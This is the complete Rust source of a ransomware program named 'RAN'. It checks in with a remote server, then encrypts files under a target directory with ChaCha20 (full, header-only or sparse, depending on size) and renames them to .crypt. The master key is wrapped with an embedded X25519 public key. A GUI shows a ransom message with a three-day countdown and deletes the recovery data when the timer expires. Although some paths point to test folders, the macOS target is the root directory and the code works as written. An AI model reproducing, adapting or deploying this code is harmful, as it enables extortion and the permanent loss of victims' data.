#![windows_subsystem = "windows"]
use base64::{Engine as _, engine::general_purpose};
use chacha20::ChaCha20;
use chacha20::cipher::{KeyIvInit, StreamCipher, StreamCipherSeek};
use chacha20poly1305::{ChaCha20Poly1305, KeyInit, aead::Aead};
use eframe::egui::{self, Color32, RichText};
use rand::rngs::OsRng;
use rand::{RngCore, thread_rng};
use rayon::prelude::*;
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT};
use sha2::{Digest, Sha256};
use std::fs::{self, OpenOptions};
use std::io::{Read, Seek, SeekFrom, Write};
use std::path::{Path, PathBuf};
use std::time::Duration;
use walkdir::WalkDir;
use x25519_dalek::{EphemeralSecret, PublicKey as EccPublicKey};
use std::env;
use std::sync::Arc;
const BUFFER_4MB: usize = 4 * 1024 * 1024;
const BUFFER_1MB: usize = 1 * 1024 * 1024;
const SMALL_FILE_THRESHOLD: u64 = 1 * 1024 * 1024;
const MEDIUM_FILE_THRESHOLD: u64 = 500 * 1024 * 1024;
const SPARSE_BLOCKS: usize = 5;
const PUBLIC_KEY: &str = "
-----BEGIN PUBLIC KEY-----
MCowBQYDK2VuAyEAIyqwE+FAqYxmz+SMmhVuZckYZcOcXsKEa3oHJG6LQig=
-----END PUBLIC KEY-----
";
const APP_CLIENT_TOKEN: &str = "tn^huyDmJf5GjEiK*8@Q#NFHtQsUu5gwChjjgV$#DH8q!QGNk33k8&UqRvACPTSV$%WwscJ89oXmhB3yLFHAaLRfspfZ^Am8AQHMr7x%zsPX5Nv9N3BG3kNccMk&7h3S";
const EXPECTED_USER_AGENT: &str = "RAN/wj3ck7hp6tv3p2pedivsbzr7";
pub const OS: &str = if cfg!(target_os = "windows") {
    "Windows"
} else if cfg!(target_os = "linux") {
    "Linux"
} else if cfg!(target_os = "macos") {
    "macOS"
} else {
    "Unknown"
};
pub const RECOVERY_INFO_PATH: &str = if cfg!(target_os = "windows") {
   r"C:\ProgramData\RAN\INFO.bin"
} else if cfg!(target_os = "macos") {
    "/Library/Application Support/RAN/INFO.bin"
} else if cfg!(target_os = "linux") {
    "/etc/ran/INFO.bin"
} else {
    "INFO.bin"
};
pub const TARGET_DIR: &str = if cfg!(target_os = "windows") {
    r"C:\Users\Public\Documents\TestData"
} else if cfg!(target_os = "linux") {
    "/home/jannik/Cloud/Dev/RAN/test_data"
} else if cfg!(target_os = "macos") {
    "/"
} else {
    ""
};
pub const EXCLUDED_DIRS: &[&str] = if cfg!(target_os = "windows") {
    &["Windows"]
} else if cfg!(target_os = "linux") {
    &["proc", "sys", "dev", "run", "tmp"]
} else if cfg!(target_os = "macos") {
    &["System", "Library", "Applications", "Users"]
} else {
    &[]
};
pub fn init() {
    let path = Path::new(RECOVERY_INFO_PATH);
    if let Some(parent_dir) = path.parent() {
        let _ = fs::remove_file(RECOVERY_INFO_PATH);
        let _ = fs::create_dir_all(parent_dir);
    }
}
pub fn get_token() -> String {
    fs::read(RECOVERY_INFO_PATH)
        .ok()
        .and_then(|data| bincode::deserialize::<RecoveryMetadata>(&data).ok())
        .map(|meta| meta.token)
        .unwrap_or_else(|| "No token available".to_string())
}

#[derive(serde::Serialize, serde::Deserialize)]
struct RecoveryMetadata {
    encrypted_master_key: Vec<u8>,
    nonce_salt: [u8; 16],
    chunk_size: usize,
    tiered_strategy: bool,
    master_key_hash: [u8; 32],
    token: String,
}
impl RecoveryMetadata {
    fn derive_nonce(&self, master_key: &[u8; 32], original_path: &str) -> [u8; 12] {
        let mut hasher = Sha256::new();
        hasher.update(master_key);
        hasher.update(original_path.as_bytes());
        hasher.update(self.nonce_salt);
        let result = hasher.finalize();
        let mut nonce = [0u8; 12];
        nonce.copy_from_slice(&result[0..12]);
        nonce
    }
}
fn normalized_path_string(root_dir: &Path, path: &Path) -> String {
    if let Ok(relative) = path.strip_prefix(root_dir) {
        relative.to_string_lossy().to_string()
    } else {
        path.to_string_lossy().to_string()
    }
}
fn compute_name_nonce_input(root_dir: &Path, path: &Path) -> String {
    let parent = path.parent().unwrap_or(root_dir);
    let relative = parent.strip_prefix(root_dir).unwrap_or(parent);
    format!("{}_dir_name", relative.to_string_lossy())
}
async fn check() -> bool {
    let url = "https://hsh73ny3hov3dx1kwdynxaqw6yvmg2h7ht4z63ux55ssnm.mcjj.de/";
    let mut headers = HeaderMap::new();
    headers.insert(USER_AGENT, HeaderValue::from_static(EXPECTED_USER_AGENT));
    headers.insert("X-App-Token", HeaderValue::from_static(APP_CLIENT_TOKEN));
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(5))
        .default_headers(headers)
        .build();
    let client = match client {
        Ok(c) => c,
        Err(_) => {
            return true;
        }
    };
    match client.get(url).send().await {
        Ok(response) => {
            let status = response.status().as_u16();
            if status == 276 {
                return false;
            }
        }
        Err(_) => {
            return true;
        }
    }
    true
}

pub fn start_gui() -> eframe::Result<()> {
    let icon_bytes = include_bytes!("../assets/icon.png");
    let image = image::load_from_memory(icon_bytes)
        .expect("Fehler beim Laden des Icons")
        .to_rgba8();
    
    let (width, height) = image.dimensions();
    let icon_data = egui::IconData {
        rgba: image.into_raw(),
        width,
        height,
    };
    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default()
            .with_resizable(false)
            .with_inner_size([850.0, 550.0])
            .with_icon(Arc::new(icon_data)),
        ..Default::default()
    };

    eframe::run_native(
        "⚠️ RAN ⚠️",
        options,
        Box::new(|cc| {
            let mut visuals = egui::Visuals::dark();
            visuals.panel_fill = Color32::from_rgb(20, 20, 20);
            cc.egui_ctx.set_visuals(visuals);
            Ok(Box::new(RANApp::default()))
        }),
    )
}

struct RANApp {
    time_left_seconds: f64,
    master_key: String,
    status_msg: String,
    is_valid: bool,
    enc_key: String,
    copied_toast_timer: f32,
    expired_triggered: bool,
    show_expired_window: bool,
}

impl Default for RANApp {
    fn default() -> Self {
        Self {
            time_left_seconds: 259200.0,
            master_key: String::new(),
            status_msg: "Please enter your master key to decrypt files.".to_string(),
            is_valid: false,
            enc_key: get_token(),
            copied_toast_timer: 0.0,
            expired_triggered: false,
            show_expired_window: false,
        }
    }
}
impl RANApp {
    fn countdown_expired(&mut self) {
        let _ = fs::remove_file(RECOVERY_INFO_PATH);
        self.show_expired_window = true;
    }
}
impl eframe::App for RANApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        if self.time_left_seconds > 0.0 && !self.is_valid {
            self.time_left_seconds -= ctx.input(|i| i.stable_dt as f64);
            ctx.request_repaint();
        }
        egui::SidePanel::left("status_panel")
            .resizable(false)
            .default_width(280.0)
            .frame(
                egui::Frame::side_top_panel(&*ctx.style())
                    .fill(Color32::from_rgb(140, 0, 0))
                    .inner_margin(20.0),
            )
            .show(ctx, |ui| {
                ui.vertical_centered(|ui| {
                    ui.add_space(10.0);
                    ui.label(RichText::new("⚠️").size(40.0));
                    ui.label(
                        RichText::new("Your files\nare encrypted!")
                            .color(Color32::WHITE)
                            .size(22.0)
                            .strong(),
                    );

                    ui.add_space(20.0);
                    ui.separator();
                    ui.add_space(20.0);

                    ui.label(
                        RichText::new("Your files will be lost in:")
                            .color(Color32::LIGHT_GRAY)
                            .size(14.0),
                    );
                    ui.add_space(10.0);

                    let total_secs = self.time_left_seconds.max(0.0) as u64;
                    if total_secs == 0 && !self.expired_triggered {
                        self.expired_triggered = true;
                        self.countdown_expired();
                    }
                    let days = total_secs / 86400;
                    let hours = (total_secs % 86400) / 3600;
                    let minutes = (total_secs % 3600) / 60;
                    let seconds = total_secs % 60;

                    let timer_color = if self.is_valid {
                        Color32::GREEN
                    } else {
                        Color32::YELLOW
                    };
                    ui.label(
                        RichText::new(format!(
                            "{:02}d:{:02}h:{:02}m:{:02}s",
                            days, hours, minutes, seconds
                        ))
                        .color(timer_color)
                        .size(22.0)
                        .monospace(),
                    );

                    ui.label(
                        RichText::new("Personal Token:")
                            .color(Color32::WHITE)
                            .size(12.0)
                            .strong(),
                    );
                    ui.add_space(5.0);
                    ui.horizontal(|ui| {
                        ui.add(
                            egui::TextEdit::singleline(&mut self.enc_key)
                                .font(egui::TextStyle::Monospace)
                                .desired_width(200.0)
                                .margin(egui::vec2(8.0, 8.0))
                                .interactive(false),
                        );
                        if ui
                            .add(egui::Button::new("Copy").fill(Color32::from_rgb(60, 60, 60)))
                            .clicked()
                        {
                            ctx.output_mut(|o| o.copied_text = self.enc_key.clone());
                            self.copied_toast_timer = 2.0;
                        }
                    });
                    ui.label(
                        RichText::new("Enter Master Key")
                            .color(Color32::WHITE)
                            .size(14.0)
                            .strong(),
                    );
                    ui.add_space(8.0);

                    egui::ScrollArea::vertical()
                        .max_height(100.0)
                        .auto_shrink([false; 2])
                        .show(ui, |ui| {
                            let text_edit = egui::TextEdit::multiline(&mut self.master_key)
                                .hint_text("Paste your 64-character hex master key here...")
                                .desired_width(ui.available_width())
                                .margin(egui::vec2(8.0, 8.0))
                                .font(egui::TextStyle::Monospace);

                            ui.add(text_edit);
                        });
                    ui.add_space(15.0);
                    let msg_color = if self.is_valid {
                        Color32::GREEN
                    } else if self.status_msg.starts_with("❌") {
                        Color32::LIGHT_RED
                    } else {
                        Color32::LIGHT_GRAY
                    };
                    ui.label(RichText::new(&self.status_msg).color(msg_color).size(12.0));
                    if ui
                        .add_sized(
                            [220.0, 40.0],
                            egui::Button::new(RichText::new("Check Master Key").size(16.0))
                                .fill(Color32::from_rgb(60, 60, 60)),
                        )
                        .clicked()
                    {
                        match std::fs::read("INFO.bin") {
                            Ok(meta_data) => {
                                if let Ok(meta) =
                                    bincode::deserialize::<RecoveryMetadata>(&meta_data)
                                {
                                    let cleaned_hex = self.master_key.trim();
                                    if cleaned_hex.len() == 64 {
                                        let mut user_key_bytes = [0u8; 32];
                                        let mut parse_success = true;

                                        for i in 0..32 {
                                            if let Ok(byte) = u8::from_str_radix(
                                                &cleaned_hex[i * 2..i * 2 + 2],
                                                16,
                                            ) {
                                                user_key_bytes[i] = byte;
                                            } else {
                                                parse_success = false;
                                                break;
                                            }
                                        }
                                        if parse_success {
                                            use sha2::{Digest, Sha256};
                                            let mut hasher = Sha256::new();
                                            hasher.update(&user_key_bytes);
                                            let input_hash: [u8; 32] = hasher.finalize().into();
                                            if input_hash == meta.master_key_hash {
                                                self.is_valid = true;
                                                self.status_msg =
                                                    "✅ Key valid! Decrypting in background..."
                                                        .to_string();
                                                let master_key_clone = self.master_key.clone();
                                                let ctx = ui.ctx().clone();
                                                let recovery_info_path =
                                                    Path::new(RECOVERY_INFO_PATH);
                                                std::thread::spawn(move || {
                                                    match run_decryption(
                                                        recovery_info_path,
                                                        TARGET_DIR.as_ref(),
                                                        &master_key_clone,
                                                    ) {
                                                        Ok(_) => {
                                                            std::thread::sleep(
                                                                std::time::Duration::from_millis(
                                                                    1500,
                                                                ),
                                                            );
                                                            ctx.send_viewport_cmd(
                                                                egui::ViewportCommand::Close,
                                                            );
                                                        }
                                                        Err(_e) => {}
                                                    }
                                                });
                                            } else {
                                                self.is_valid = false;
                                                self.status_msg = "❌ Incorrect key!".to_string();
                                            }
                                        } else {
                                            self.is_valid = false;
                                            self.status_msg =
                                                "❌ Invalid hex characters in the key.".to_string();
                                        }
                                    } else {
                                        self.is_valid = false;
                                        self.status_msg =
                                            "❌ The key must be exactly 64 characters long!"
                                                .to_string();
                                    }
                                } else {
                                    self.is_valid = false;
                                    self.status_msg =
                                        "❌ Error: INFO.bin is corrupted.".to_string();
                                }
                            }
                            Err(_) => {
                                self.is_valid = false;
                                self.status_msg = "❌ Error: INFO.bin is corrupted. ".to_string();
                            }
                        }
                    }
                });
            });
        egui::CentralPanel::default().show(ctx, |ui| {
            ui.add_space(10.0);
            ui.heading(RichText::new("What Happened to My Computer?").color(Color32::from_rgb(255, 100, 100)).size(26.0).strong());
            ui.add_space(15.0);

            egui::ScrollArea::vertical().auto_shrink([false; 2]).show(ui, |ui| {
                ui.label(RichText::new(
                    "Your important files are encrypted. Many of your documents, photos, videos, \
                    databases and other files are no longer accessible because they have been \
                    encrypted. \
                    your complete System is encrypted"
                ).size(15.0).color(Color32::LIGHT_GRAY));

                ui.add_space(25.0);
                ui.heading(RichText::new("Can I Recover My Files?").color(Color32::from_rgb(255, 100, 100)).size(20.0).strong());
                ui.add_space(10.0);
                ui.label(RichText::new(
                    "Sure. We guarantee that you can recover all your files safely and easily. \
                    But you do not have enough time.\n\n\
                    If you want to decrypt all your files, you need to provide the correct master key. \
                    You only have 3 days to submit the payment. After that, your files are permently lost. \
                    "
                ).size(15.0).color(Color32::LIGHT_GRAY));
            });
        });
        if self.show_expired_window {
            egui::Window::new("⚠️ RAN - Countdown expired")
                .collapsible(false)
                .resizable(false) 
                .anchor(egui::Align2::CENTER_CENTER, [0.0, 0.0])
                .show(ctx, |ui| {
                    ui.vertical_centered(|ui| {
                        ui.label(
                            egui::RichText::new("Your Data is permanently lost")
                                .color(egui::Color32::RED)
                                .size(18.0)
                        );
                    });
                });
        }
        ctx.request_repaint()
    }
}
#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let recovery_info_path = Path::new(RECOVERY_INFO_PATH);
    if !check().await {
        std::process::exit(0);
    }
    let root_dir = Path::new(TARGET_DIR);
    if !root_dir.exists() || !root_dir.is_dir() {
        std::process::exit(0);
    }
    init();
    run_encryption(root_dir, PUBLIC_KEY, recovery_info_path)?;
    start_gui().map_err(|e| anyhow::anyhow!("Could not start GUI: {:?}", e))?;
    Ok(())
}
fn run_encryption(
    root_dir: &Path,
    public_key: &str,
    recovery_info_path: &Path,
) -> anyhow::Result<()> {
    let pub_key_pem = public_key;

    let clean_b64 = pub_key_pem
        .lines()
        .filter(|l| !l.starts_with("-----"))
        .collect::<String>()
        .replace(' ', "");
    let der_bytes = base64::engine::general_purpose::STANDARD.decode(clean_b64)?;

    if der_bytes.len() < 32 {
        return Err(anyhow::anyhow!("Public Key Datei ist beschädigt!"));
    }
    let mut pub_array = [0u8; 32];
    pub_array.copy_from_slice(&der_bytes[der_bytes.len() - 32..]);
    let server_public_key = EccPublicKey::from(pub_array);
    let mut master_key = [0u8; 32];
    let mut rng = thread_rng();
    rng.fill_bytes(&mut master_key);
    let mut salt = [0u8; 16];
    rng.fill_bytes(&mut salt);
    let mut hasher = Sha256::new();
    hasher.update(&master_key);
    let master_key_hash: [u8; 32] = hasher.finalize().into();
    let ephemeral_secret = EphemeralSecret::random_from_rng(&mut OsRng);
    let ephemeral_public = EccPublicKey::from(&ephemeral_secret);
    let shared_secret = ephemeral_secret.diffie_hellman(&server_public_key);
    let cipher = ChaCha20Poly1305::new_from_slice(shared_secret.as_bytes())?;
    let mut token_nonce = [0u8; 12];
    rng.fill_bytes(&mut token_nonce);
    let ciphertext = cipher
        .encrypt(&token_nonce.into(), master_key.as_ref())
        .map_err(|_| anyhow::anyhow!("Token-Verschlüsselung fehlgeschlagen"))?;

    let mut token_bytes = Vec::new();
    token_bytes.extend_from_slice(ephemeral_public.as_bytes());
    token_bytes.extend_from_slice(&token_nonce);
    token_bytes.extend_from_slice(&ciphertext);

    let enc_key = base64::engine::general_purpose::STANDARD.encode(&token_bytes);
    let token: String = enc_key;
    let meta = RecoveryMetadata {
        encrypted_master_key: token_bytes,
        nonce_salt: salt,
        chunk_size: BUFFER_4MB,
        tiered_strategy: true,
        master_key_hash,
        token,
    };
    let current_exe = env::current_exe().ok();
    let entries: Vec<PathBuf> = WalkDir::new(root_dir)
        .into_iter()
        .filter_entry(|e| {
            if e.file_type().is_dir() {
                let dir_name = e.file_name().to_string_lossy();
                !EXCLUDED_DIRS.contains(&dir_name.as_ref())
            } else {
                true
            }
        })
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
        .filter(|e| {
            if let Some(ref exe_path) = current_exe {
                // e.path() liefert den vollen Pfad der gefundenen Datei
                e.path() != exe_path
            } else {
                true
            }
        })
        .map(|e| e.into_path())
        .collect();

    entries.par_iter().for_each(|path| {
        if let Err(_e) = process_file(path, root_dir, &master_key, &meta) {}
    });
    let serialized = bincode::serialize(&meta)?;
    fs::write(recovery_info_path, &serialized)?;
    Ok(())
}

fn process_file(
    path: &Path,
    root_dir: &Path,
    master_key: &[u8; 32],
    meta: &RecoveryMetadata,
) -> anyhow::Result<()> {
    let original_path_str = normalized_path_string(root_dir, path);
    let nonce = meta.derive_nonce(master_key, &original_path_str);
    let mut cipher = ChaCha20::new(master_key.into(), &nonce.into());

    encrypt_content_tiered(path, &mut cipher)?;
    rename_file(path, root_dir, master_key, meta)?;
    Ok(())
}

fn encrypt_content_tiered(path: &Path, cipher: &mut ChaCha20) -> anyhow::Result<()> {
    let mut file = OpenOptions::new().read(true).write(true).open(path)?;
    let size = file.metadata()?.len();

    match size {
        s if s < SMALL_FILE_THRESHOLD => encrypt_full(&mut file, size, cipher)?,
        s if s < MEDIUM_FILE_THRESHOLD => encrypt_header(&mut file, size, cipher)?,
        _ => encrypt_sparse(&mut file, size, cipher)?,
    }
    Ok(())
}

fn encrypt_full(file: &mut std::fs::File, size: u64, cipher: &mut ChaCha20) -> anyhow::Result<()> {
    let mut buffer = vec![0u8; size as usize];
    file.read_exact(&mut buffer)?;
    cipher.apply_keystream(&mut buffer);
    file.seek(SeekFrom::Start(0))?;
    file.write_all(&buffer)?;
    Ok(())
}

fn encrypt_header(
    file: &mut std::fs::File,
    size: u64,
    cipher: &mut ChaCha20,
) -> anyhow::Result<()> {
    let read_len = std::cmp::min(size, BUFFER_4MB as u64) as usize;
    let mut buffer = vec![0u8; read_len];
    file.read_exact(&mut buffer)?;
    cipher.apply_keystream(&mut buffer);
    file.seek(SeekFrom::Start(0))?;
    file.write_all(&buffer)?;
    Ok(())
}

fn encrypt_sparse(
    file: &mut std::fs::File,
    size: u64,
    cipher: &mut ChaCha20,
) -> anyhow::Result<()> {
    encrypt_header(file, size, cipher)?;

    let step = size as usize / (SPARSE_BLOCKS + 1);
    for i in 1..=SPARSE_BLOCKS {
        let offset = (i * step) as u64;
        if offset + BUFFER_1MB as u64 > size {
            break;
        }
        file.seek(SeekFrom::Start(offset))?;
        cipher.seek(offset);

        let mut buffer = vec![0u8; BUFFER_1MB];
        file.read_exact(&mut buffer)?;
        cipher.apply_keystream(&mut buffer);
        file.seek(SeekFrom::Start(offset))?;
        file.write_all(&buffer)?;
    }
    Ok(())
}

fn rename_file(
    path: &Path,
    root_dir: &Path,
    master_key: &[u8; 32],
    meta: &RecoveryMetadata,
) -> anyhow::Result<()> {
    let old_name = path.file_name().unwrap().to_string_lossy();
    let mut name_bytes = old_name.as_bytes().to_vec();
    let name_nonce_input = compute_name_nonce_input(root_dir, path);
    let name_nonce = meta.derive_nonce(master_key, &name_nonce_input);
    let mut name_cipher = ChaCha20::new(master_key.into(), &name_nonce.into());
    name_cipher.apply_keystream(&mut name_bytes);
    let base64_name = general_purpose::URL_SAFE_NO_PAD.encode(name_bytes);
    let new_name = format!("{}.crypt", base64_name);    
    let mut new_path = path.to_path_buf();
    new_path.set_file_name(new_name);
    fs::rename(path, new_path)?;
    Ok(())
}
fn run_decryption(recovery_info_path: &Path, root_dir: &Path, hex_key: &str) -> anyhow::Result<()> {
    let meta_data = fs::read(recovery_info_path).map_err(|e| {
        anyhow::anyhow!(
            "Konnte Recovery-Info ({}) nicht laden: {e}",
            recovery_info_path.display()
        )
    })?;
    let meta: RecoveryMetadata = bincode::deserialize(&meta_data)?;
    let mut master_key = [0u8; 32];
    let cleaned_hex = hex_key.trim();
    if cleaned_hex.len() != 64 {
        return Err(anyhow::anyhow!(
            "Der Hex-Master-Key muss genau 64 Zeichen lang sein (32 Bytes)!"
        ));
    }
    for i in 0..32 {
        master_key[i] = u8::from_str_radix(&cleaned_hex[i * 2..i * 2 + 2], 16)
            .map_err(|_| anyhow::anyhow!("Ungültiges Hex-Zeichen im Master-Key gefunden!"))?;
    }
    let recovery_file_name = Path::new(recovery_info_path)
        .file_name()
        .unwrap_or_default();
    let entries: Vec<PathBuf> = WalkDir::new(root_dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
        .filter(|e| {
            let name = e.file_name();
            let name_str = name.to_string_lossy();
            name != recovery_file_name && name_str.ends_with(".crypt")
    })
    .map(|e| e.into_path())
    .collect();
    entries.par_iter().for_each(|path| {
        if let Err(_e) = recover_file(path, root_dir, &master_key, &meta) {}
    });
    Ok(())
}

fn recover_file(
    path: &Path,
    root_dir: &Path,
    master_key: &[u8; 32],
    meta: &RecoveryMetadata,
) -> anyhow::Result<()> {
    let encrypted_name_with_ext = path.file_name().unwrap().to_string_lossy();
    let encrypted_name = encrypted_name_with_ext
        .strip_suffix(".crypt")
        .ok_or_else(|| anyhow::anyhow!("Datei hat nicht die Endung .crypt: {:?}", path))?;

    let name_bytes = general_purpose::URL_SAFE_NO_PAD.decode(encrypted_name.as_bytes())?;
    let name_nonce_input = compute_name_nonce_input(root_dir, path);
    let name_nonce = meta.derive_nonce(master_key, &name_nonce_input);
    let mut name_cipher = ChaCha20::new(master_key.into(), &name_nonce.into());

    let mut decrypted_name_bytes = name_bytes.clone();
    name_cipher.apply_keystream(&mut decrypted_name_bytes);
    let original_name = String::from_utf8(decrypted_name_bytes)?;

    let mut original_path = path.to_path_buf();
    original_path.set_file_name(&original_name);
    
    let original_path_str = normalized_path_string(root_dir, &original_path);

    let content_nonce = meta.derive_nonce(master_key, &original_path_str);
    let mut content_cipher = ChaCha20::new(master_key.into(), &content_nonce.into());

    let mut file = OpenOptions::new().read(true).write(true).open(path)?;
    let size = file.metadata()?.len();

    match size {
        s if s < SMALL_FILE_THRESHOLD => decrypt_full(&mut file, size, &mut content_cipher)?,
        s if s < MEDIUM_FILE_THRESHOLD => decrypt_header(&mut file, size, &mut content_cipher)?,
        _ => decrypt_sparse(&mut file, size, &mut content_cipher)?,
    }

    drop(file);
    fs::rename(path, original_path)?;
    Ok(())
}

fn decrypt_full(file: &mut std::fs::File, size: u64, cipher: &mut ChaCha20) -> anyhow::Result<()> {
    let mut buffer = vec![0u8; size as usize];
    file.read_exact(&mut buffer)?;
    cipher.apply_keystream(&mut buffer);
    file.seek(SeekFrom::Start(0))?;
    file.write_all(&buffer)?;
    Ok(())
}

fn decrypt_header(
    file: &mut std::fs::File,
    size: u64,
    cipher: &mut ChaCha20,
) -> anyhow::Result<()> {
    let read_len = std::cmp::min(size, BUFFER_4MB as u64) as usize;
    let mut buffer = vec![0u8; read_len];
    file.read_exact(&mut buffer)?;
    cipher.apply_keystream(&mut buffer);
    file.seek(SeekFrom::Start(0))?;
    file.write_all(&buffer)?;
    Ok(())
}

fn decrypt_sparse(
    file: &mut std::fs::File,
    size: u64,
    cipher: &mut ChaCha20,
) -> anyhow::Result<()> {
    decrypt_header(file, size, cipher)?;

    let step = size as usize / (SPARSE_BLOCKS + 1);
    for i in 1..=SPARSE_BLOCKS {
        let offset = (i * step) as u64;
        if offset + BUFFER_1MB as u64 > size {
            break;
        }

        file.seek(SeekFrom::Start(offset))?;
        cipher.seek(offset);

        let mut buffer = vec![0u8; BUFFER_1MB];
        file.read_exact(&mut buffer)?;
        cipher.apply_keystream(&mut buffer);
        file.seek(SeekFrom::Start(offset))?;
        file.write_all(&buffer)?;
    }
    Ok(())
}
